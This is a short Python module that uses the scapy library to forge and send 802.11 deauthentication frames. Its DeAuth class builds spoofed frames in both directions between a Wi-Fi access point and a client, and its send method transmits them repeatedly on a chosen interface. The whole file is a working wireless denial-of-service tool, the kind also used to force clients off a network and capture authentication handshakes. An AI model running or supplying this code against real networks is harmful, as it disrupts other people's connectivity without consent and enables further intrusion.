# -*- coding: utf-8 -*-

from scapy.sendrecv import sendp
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11
from multimethod import multimethod

from .types import CellClientPair


class DeAuth:

    @multimethod
    def __init__(self, cell: str, client: str):
        self.client_pkt = RadioTap() / Dot11(addr1=client, addr2=cell, addr3=cell) / Dot11Deauth(reason=7)
        self.cell_pkt = RadioTap() / Dot11(addr1=cell, addr2=client, addr3=client) / Dot11Deauth(reason=7)

    @multimethod
    def __init__(self, pair: CellClientPair):
        self.__init__(pair.cell, pair.client)

    def send(self, iface, count):
        sendp([self.client_pkt, self.cell_pkt], iface=iface, count=count, verbose=False)
